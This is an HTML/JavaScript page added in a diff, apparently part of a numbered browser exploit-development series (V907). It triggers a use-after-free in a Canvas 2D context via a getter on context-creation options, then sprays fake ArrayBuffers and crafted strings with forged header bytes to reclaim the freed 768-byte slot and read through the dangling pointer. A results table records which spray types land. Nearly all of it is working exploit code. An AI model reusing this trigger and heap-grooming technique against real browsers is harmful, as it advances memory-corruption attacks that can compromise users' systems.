@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V907 - Canvas UAF cross-type hit isolation (V680 re-run)</title>
+<style>
+  body { background:#0b0e14; color:#d7e0ea; font-family:ui-monospace,Menlo,monospace; padding:14px; }
+  h1 { color:#58a6ff; font-size:15px; margin:0 0 6px; }
+  h2 { color:#39c5bb; font-size:13px; margin:16px 0 6px; }
+  p  { color:#8b949e; font-size:12px; margin:4px 0 10px; line-height:1.55; }
+  pre { font-size:12px; white-space:pre-wrap; }
+  table { border-collapse:collapse; font-size:11px; margin-top:8px; }
+  td,th { border:1px solid #30363d; padding:3px 7px; text-align:left; vertical-align:top; }
+  th { color:#58a6ff; }
+  .crash { color:#ff7b72; }
+  .ok { color:#7ee787; }
+  .skip { color:#d29922; }
+  .hit { color:#ffa657; font-weight:bold; }
+  .bad { color:#ff7b72; font-weight:bold; }
+  code { color:#c9d1d9; background:#21262d; padding:1px 5px; border-radius:4px; }
+  .key { border-left:3px solid #d29922; padding-left:8px; }
+</style>
+</head>
+<body>
+<h1>V907 - V680 hit isolation, one case per load</h1>
+
+<p class="key">
+<b>Question:</b> V680 (52 configs, seq 1502-1597) showed 7 crashes with no OSTEP —
+<code>style/48</code>, <code>matchmedia</code>, <code>text/704</code>,
+<code>strfake8</code>, <code>strfake16</code>, <code>abfake</code>, <code>abzero</code> —
+but they were never isolated one-per-load with last-stage logging. Were they hits
+(candidate took the 768B slot) or sweep artifacts? Can any of them produce a
+<i>readable</i> value instead of a crash?
+</p>
+
+<p>
+<b>Design:</b> V680 logic (candidate spray, then 24 tagged 2d contexts
+<code>lineWidth=200..223</code>, then one <code>savedCtx.lineWidth</code> read) with
+V906 harness (one case per page load, last-stage in localStorage, sync beacons,
+auto-advance; a missing DONE with a delayed next START = crash at S4-read).
+Trigger is V906's (v=0, no saves, inline stack) — it differs from V680's 32 saves,
+but the reclaim bytes are the candidate's, so the hit logic is unchanged.
+A <code>SUSPECT</code> (non-tagged number) is followed by 4 extra reads
+(<code>miterLimit/globalAlpha/lineDashOffset/shadowBlur</code> + hex) to catch a
+readable fake.
+</p>
+
+<p>
+Start: <b>?op=auto</b> &nbsp;|&nbsp; one case: <b>?case=style48</b> &nbsp;|&nbsp; clear: <b>?reset=1</b>
+<br>After a crash just reopen <b>?op=auto</b>. Done when the page prints <b>ALL CASES DONE</b>.
+</p>
+
+<h2>Cases</h2>
+<pre>
+same        control: no candidate, 24 taggers only      must be MISS 200..223
+abzero      control: 16 x ArrayBuffer(768) zero         must be CRASH (AB hit)
+style16     24 divs x 16 --p props    neighbor, V680 miss; polarity control
+style48     24 divs x 48 --p props    V680 hit: expect CRASH
+attrs48     24 divs x 48 attributes   V680 miss; contrast with style48
+matchmedia  8 x matchMedia            V680 hit: expect CRASH
+text704     24 x TextNode 704 chars   V680 hit: expect CRASH
+text1024    24 x TextNode 1024 chars  neighbor, V680 miss
+strfake8    24 x strfake 720 (8-bit)  V680 hit: expect CRASH (null vector)
+strfake16   24 x strfake 360 (16-bit) V680 hit: expect CRASH (null vector)
+abfake      16 x ArrayBuffer(768)     V680 hit: expect CRASH (null vector)
+strraw8     24 x raw string 720       NEW: payload only, +112/+120 untouched
+</pre>
+
+<pre id="out">starting...</pre>
+<div id="tbl"></div>
+
+<h2>FINAL RESULTS (2026-11-06, beacons 10038-10062) — always shown, even if localStorage cleared</h2>
+<p class="note">12 cases, 16:02:17-16:02:58 UTC. <b>5 MISS, 7 CRASH, 0 SUSPECT</b> — cross-type readable fake is dead. Reopen <code>?op=auto</code> to run again; <code>?reset=1</code> clears localStorage only.</p>
+<table>
+<tr><th>case</th><th>result</th><th>detail</th></tr>
+<tr><td>same</td><td class="ok">MISS</td><td>kept=0, made=24, lw=205 (tagged ctx won) — control OK</td></tr>
+<tr><td>abzero</td><td class="crash">CRASH</td><td>last=abzero:S3-tagged (crash at read, after taggers)</td></tr>
+<tr><td>style16</td><td class="ok">MISS</td><td>kept=24, made=24, lw=206 — polarity neighbor OK</td></tr>
+<tr><td>style48</td><td class="crash">CRASH</td><td>last=style48:S3-tagged — V680 hit confirmed isolated</td></tr>
+<tr><td>attrs48</td><td class="ok">MISS</td><td>kept=24, made=24, lw=207 — geometry matters: 48 attrs miss, 48 style props crash</td></tr>
+<tr><td>matchmedia</td><td class="ok">MISS</td><td>kept=8, made=24, lw=202 — V680 hit NOT reproduced (single-shot MISS)</td></tr>
+<tr><td>text704</td><td class="crash">CRASH</td><td>last=text704:S2-candidate — crashed during/just before taggers, NOT at read; treat as spray-phase instability, not read proof</td></tr>
+<tr><td>text1024</td><td class="ok">MISS</td><td>kept=24, made=24, lw=204 — polarity neighbor OK</td></tr>
+<tr><td>strfake8</td><td class="crash">CRASH</td><td>last=strfake8:S3-tagged — V680 hit confirmed isolated</td></tr>
+<tr><td>strfake16</td><td class="crash">CRASH</td><td>last=strfake16:S2-candidate — crashed during/just before taggers, NOT at read</td></tr>
+<tr><td>abfake</td><td class="crash">CRASH</td><td>last=abfake:S3-tagged — V680 hit confirmed isolated</td></tr>
+<tr><td>strraw8</td><td class="crash">CRASH</td><td>last=strraw8:S3-tagged — leave-header (payload only) also unreadable; +112 is not a readable vector</td></tr>
+</table>
+<p class="note"><b>Verdict:</b> cross-type reclaim to 768B is real (style48, strfake8, abfake, abzero), but no type yields a readable value (0 SUSPECT). Leave-header hypothesis dead. Neighbor polarity (style/attrs, text 704/1024) proves geometry — 768-byte class lands, larger misses. Crash at S2 ≠ read deref: text704/strfake16 never reached the dangling read.</p>
+
+<script>
+'use strict';
+
+var SEEK = location.pathname;
+var RUN = 'r' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 7);
+
+function lsGet(k) { try { return window.localStorage.getItem('v907_' + k); } catch (e) { return null; } }
+function lsSet(k, v) { try { window.localStorage.setItem('v907_' + k, String(v)); } catch (e) {} }
+function lsDel(k) { try { window.localStorage.removeItem('v907_' + k); } catch (e) {} }
+
+function bks(tag, body) {
+  var u = '/beacon/V907-' + tag + '?d=' +
+          encodeURIComponent(String(body == null ? '' : body).slice(0, 460)) +
+          '&run=' + encodeURIComponent(RUN) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); }
+  catch (e) { try { var i = new Image(); i.src = u; } catch (e2) {} }
+}
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function errOf(e) { return e ? String(e.name || 'Error') + ':' + String(e.message || '').slice(0, 70) : 'none'; }
+function hexOf(x) { var f = new Float64Array(1), u = new Uint32Array(f.buffer); f[0] = x; return '0x' + ('00000000' + u[1].toString(16)).slice(-8) + ('00000000' + u[0].toString(16)).slice(-8); }
+function stLast(id, stage) { try { lsSet('last', id + ':' + stage); } catch (e) {} }
+
+/* ---------- UAF trigger (V906 verbatim, v=0 inline) ---------- */
+function trigger() {
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  document.body.appendChild(canvas);
+  var saved = null;
+  var dict = {};
+  Object.defineProperty(dict, 'alpha', {
+    get: function () {
+      var ctx = canvas.getContext('2d');
+      if (!ctx) return true;
+      saved = ctx;
+      try {
+        ctx.lineWidth = 3.14159;
+        ctx.globalAlpha = 0.42;
+        ctx.miterLimit = 7.77;
+        ctx.lineWidth = 1.0;
+      } catch (e) {}
+      return true;
+    }
+  });
+  var bmp = null;
+  try { bmp = canvas.getContext('bitmaprenderer', dict); } catch (e2) {}
+  return { saved: saved, bmp: bmp };
+}
+
+/* ---------- V680 builders (verbatim logic) ---------- */
+var _fb = new Float64Array(1), _fu = new Uint8Array(_fb.buffer);
+function fbytes(v) { _fb[0] = v; return Array.prototype.slice.call(_fu); }
+var Z8 = [0, 0, 0, 0, 0, 0, 0, 0];
+var O8 = [1, 0, 0, 0, 1, 0, 0, 0];  /* m_size=1, m_capacity=1 */
+function w8(ch, idx, bytes) {
+  for (var k = 0; k < bytes.length; k++) {
+    var j = idx + k;
+    if (j >= 0 && j < ch.length) ch[j] = bytes[k] & 255;
+  }
+}
+function w16(ch, idx, bytes) {
+  for (var k = 0; k + 1 < bytes.length; k += 2) {
+    var j = idx + (k >> 1);
+    if (j >= 0 && j < ch.length) ch[j] = ((bytes[k] & 255) | ((bytes[k + 1] & 255) << 8)) & 65535;
+  }
+}
+function strfake(len, bits, lwv) {
+  var ch = new Array(len), i;
+  var fill = (bits === 8) ? 0x41 : 0x0041;
+  for (i = 0; i < len; i++) ch[i] = fill;
+  var lb = fbytes(lwv);
+  if (bits === 8) {
+    w8(ch, 112 - 20, Z8); w8(ch, 120 - 20, O8); w8(ch, 176 - 20, lb);   /* A */
+    w8(ch, 112, Z8);      w8(ch, 120, O8);      w8(ch, 176, lb);        /* B */
+  } else {
+    w16(ch, (112 - 20) / 2, Z8); w16(ch, (120 - 20) / 2, O8); w16(ch, (176 - 20) / 2, lb); /* A */
+    w16(ch, 112 / 2, Z8);        w16(ch, 120 / 2, O8);        w16(ch, 176 / 2, lb);        /* B */
+  }
+  var s = String.fromCharCode.apply(null, ch);
+  try { s.charCodeAt(len - 1); } catch (e) {}
+  try { s.indexOf('A'); } catch (e) {}
+  return s;
+}
+function strraw8(len, lwv) {
+  var ch = new Array(len), i;
+  for (i = 0; i < len; i++) ch[i] = 0x41;
+  var lb = fbytes(lwv);
+  w8(ch, 176 - 20, lb);   /* A: payload only */
+  w8(ch, 176, lb);        /* B: payload only */
+  var s = String.fromCharCode.apply(null, ch);
+  try { s.charCodeAt(len - 1); } catch (e) {}
+  try { s.indexOf('A'); } catch (e) {}
+  return s;
+}
+function fakeAB(len, lwv) {
+  var ab = new ArrayBuffer(len);
+  try {
+    var t = new Uint32Array(ab, 120, 2);
+    t[0] = 1; t[1] = 1;
+    new Float64Array(ab, 176, 1)[0] = lwv;
+  } catch (e) {}
+  return ab;
+}
+
+var KEEP = null;
+function buildCandidate(id) {
+  var i, j, out;
+  if (id === 'abzero') {
+    out = new Array(16);
+    for (i = 0; i < 16; i++) out[i] = new ArrayBuffer(768);
+  } else if (id === 'abfake') {
+    out = new Array(16);
+    for (i = 0; i < 16; i++) out[i] = fakeAB(768, 4400.44 + i);
+  } else if (id === 'strfake8') {
+    out = new Array(24);
+    for (i = 0; i < 24; i++) out[i] = strfake(720, 8, 5500.55 + i);
+  } else if (id === 'strfake16') {
+    out = new Array(24);
+    for (i = 0; i < 24; i++) out[i] = strfake(360, 16, 6600.66 + i);
+  } else if (id === 'strraw8') {
+    out = new Array(24);
+    for (i = 0; i < 24; i++) out[i] = strraw8(720, 7700.77 + i);
+  } else if (id === 'text704') {
+    out = new Array(24);
+    for (i = 0; i < 24; i++) { try { out[i] = document.createTextNode('A'.repeat(704)); } catch (e5) { out[i] = null; } }
+  } else if (id === 'text1024') {
+    out = new Array(24);
+    for (i = 0; i < 24; i++) { try { out[i] = document.createTextNode('A'.repeat(1024)); } catch (e5b) { out[i] = null; } }
+  } else if (id === 'style48') {
+    out = new Array(24);
+    for (i = 0; i < 24; i++) {
+      var d2 = document.createElement('div');
+      for (j = 0; j < 48; j++) d2.style.setProperty('--p' + j, j + 'px');
+      out[i] = d2;
+    }
+  } else if (id === 'style16') {
+    out = new Array(24);
+    for (i = 0; i < 24; i++) {
+      var d3 = document.createElement('div');
+      for (j = 0; j < 16; j++) d3.style.setProperty('--p' + j, j + 'px');
+      out[i] = d3;
+    }
+  } else if (id === 'attrs48') {
+    out = new Array(24);
+    for (i = 0; i < 24; i++) {
+      var d1 = document.createElement('div');
+      for (j = 0; j < 48; j++) d1.setAttribute('a' + j, 'v' + j);
+      out[i] = d1;
+    }
+  } else if (id === 'matchmedia') {
+    out = [];
+    for (i = 0; i < 8; i++) { try { out.push(window.matchMedia('(min-width:' + i + 'px)')); } catch (e13) {} }
+  } else {
+    out = [];
+  }
+  KEEP = out;
+  return out;
+}
+
+/* 24 tagged real contexts, V680 detector */
+function tagContexts(n) {
+  var keep = [], made = 0, c;
+  for (c = 0; c < n; c++) {
+    var cc = document.createElement('canvas');
+    cc.width = 1; cc.height = 1;
+    var cx = null;
+    try { cx = cc.getContext('2d'); } catch (e) {}
+    if (cx) {
+      try { cx.lineWidth = 200 + made; } catch (e2) {}
+      keep.push(cc);
+      made++;
+    }
+  }
+  return { keep: keep, made: made };
+}
+
+/* ---------- cases ---------- */
+function runCase(id) {
+  var t = trigger();
+  if (!t.saved || !t.bmp) return { tag: 'THROW', detail: 'trigger-failed:inner=' + !!t.saved + ',bmr=' + !!t.bmp };
+  stLast(id, 'S1-trigger');
+
+  var keptLen = 0, berr = null;
+  if (id !== 'same') {
+    try { keptLen = buildCandidate(id).length; } catch (eK) { berr = eK.name || 'build-err'; }
+  }
+  stLast(id, 'S2-candidate');
+
+  var tk = tagContexts(24);
+  stLast(id, 'S3-tagged');
+
+  var lw = null, le = null;
+  try { lw = t.saved.lineWidth; } catch (e) { le = errOf(e); }
+
+  var base = 'kept=' + keptLen + (berr ? ',berr=' + berr : '') + ',made=' + tk.made;
+  if (le) return { tag: 'THROW', detail: base + ',ERR=' + le };
+
+  if (typeof lw === 'number' && lw >= 200 && lw < 200 + tk.made) {
+    return { tag: 'MISS', detail: base + ',lw=' + lw + '(tagged ctx won)' };
+  }
+
+  /* SUSPECT: candidate hit and vector looked readable — read 4 more fields */
+  var extra = '';
+  var names = ['ml', 'ga', 'ldo', 'sb'];
+  var vals = [null, null, null, null];
+  try { vals[0] = t.saved.miterLimit; } catch (e1) { extra += ',ml=ERR:' + errOf(e1); }
+  try { vals[1] = t.saved.globalAlpha; } catch (e2) { extra += ',ga=ERR:' + errOf(e2); }
+  try { vals[2] = t.saved.lineDashOffset; } catch (e3) { extra += ',ldo=ERR:' + errOf(e3); }
+  try { vals[3] = t.saved.shadowBlur; } catch (e4) { extra += ',sb=ERR:' + errOf(e4); }
+  for (var g = 0; g < 4; g++) {
+    if (vals[g] !== null) extra += ',' + names[g] + '=' + vals[g] + ':' + hexOf(vals[g]);
+  }
+  return { tag: 'SUSPECT', detail: base + ',lw=' + lw + ':' + hexOf(lw) + extra };
+}
+
+var SEQUENCE = [
+  'same', 'abzero',
+  'style16', 'style48', 'attrs48',
+  'matchmedia',
+  'text704', 'text1024',
+  'strfake8', 'strfake16', 'abfake', 'strraw8'
+];
+
+var EXPECT = {
+  same: 'MISS 200..223', abzero: 'CRASH (AB hit)',
+  style16: 'MISS?', style48: 'CRASH (V680 hit)', attrs48: 'MISS?',
+  matchmedia: 'CRASH (V680 hit)',
+  text704: 'CRASH (V680 hit)', text1024: 'MISS?',
+  strfake8: 'CRASH (V680 hit)', strfake16: 'CRASH (V680 hit)',
+  abfake: 'CRASH (V680 hit)', strraw8: '? (leave-header test)'
+};
+
+function appendRes(s) { lsSet('res', (lsGet('res') || '') + s + ';'); }
+function isDone(id) { return (lsGet('done') || ';').indexOf(';' + id + ';') >= 0; }
+function markDone(id) { var d = lsGet('done') || ';'; if (d.indexOf(';' + id + ';') < 0) lsSet('done', d + id + ';'); }
+function nextCase() { for (var i = 0; i < SEQUENCE.length; i++) { if (!isDone(SEQUENCE[i])) return SEQUENCE[i]; } return null; }
+
+function esc(s) { return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }
+function render() {
+  var r = lsGet('res') || '';
+  var rows = r.split(';');
+  var html = '<table><tr><th>case</th><th>expected</th><th>result</th><th>detail</th></tr>';
+  for (var i = 0; i < rows.length; i++) {
+    if (!rows[i]) continue;
+    var p = rows[i].split('|');
+    var cls = (p[1] === 'CRASH') ? 'crash' : (p[1] === 'SUSPECT' ? 'hit' : (p[1] === 'SKIP' ? 'skip' : 'ok'));
+    var det = p[2] || '';
+    var alarm = (p[1] === 'SUSPECT');
+    html += '<tr><td>' + esc(p[0]) + '</td><td>' + esc(EXPECT[p[0]] || '') +
+            '</td><td class="' + cls + '">' + esc(p[1]) + '</td><td' + (alarm ? ' class="bad"' : '') + '>' + esc(det) + '</td></tr>';
+  }
+  html += '</table>';
+  document.getElementById('tbl').innerHTML = html;
+}
+
+async function runOne(id) {
+  bks('START', 'case=' + id + ',run=' + RUN);
+  lsSet('cur', id);
+  lsSet('last', id + ':S0-enter');
+
+  var r;
+  try { r = runCase(id); }
+  catch (e) { r = { tag: 'THROW', detail: 'harness=' + errOf(e) }; }
+
+  appendRes(id + '|' + r.tag + '|' + (r.detail || ''));
+  markDone(id);
+  lsSet('cur', '');
+  lsSet('last', id + ':S9-done');
+  bks('DONE', 'case=' + id + ',tag=' + r.tag + ',detail=' + (r.detail || '').slice(0, 380));
+  say(id + ' -> ' + r.tag + ' ' + (r.detail || ''));
+  render();
+  return r;
+}
+
+async function main() {
+  var q = location.search;
+
+  if (q.indexOf('reset=1') >= 0) {
+    lsDel('cur'); lsDel('done'); lsDel('res'); lsDel('last');
+    bks('RESET', 'cleared,run=' + RUN);
+    say('cleared. reopen with ?op=auto');
+    render();
+    return;
+  }
+
+  var cur = lsGet('cur');
+  if (cur) {
+    var last = lsGet('last') || '?';
+    appendRes(cur + '|CRASH|last=' + last);
+    markDone(cur);
+    lsDel('cur');
+    lsDel('last');
+    bks('CRASH-DETECTED', 'case=' + cur + ',last=' + last + ',run=' + RUN);
+    say('previous case CRASHED: ' + cur + ' last=' + last);
+  }
+
+  var m = /[?&]case=([^&]+)/.exec(q);
+  var one = m ? decodeURIComponent(m[1]) : '';
+  var auto = (q.indexOf('op=auto') >= 0) || (!one && q.indexOf('case=') < 0);
+
+  if (one) {
+    var rr = await runOne(one);
+    say('single case done: ' + one + ' -> ' + rr.tag);
+    render();
+    return;
+  }
+
+  if (auto) {
+    var id = nextCase();
+    if (!id) {
+      bks('FINAL', 'run=' + RUN + ',res=' + (lsGet('res') || '').slice(0, 440));
+      say('ALL CASES DONE.');
+      render();
+      return;
+    }
+    await runOne(id);
+    setTimeout(function () { location.href = SEEK + '?op=auto&r=' + Date.now(); }, 700);
+    return;
+  }
+
+  say('ready. use ?op=auto or ?case=<id>');
+  render();
+}
+
+try { main(); } catch (e) { bks('FATAL', errOf(e)); say('FATAL ' + errOf(e)); }
+</script>
+</body>
+</html>
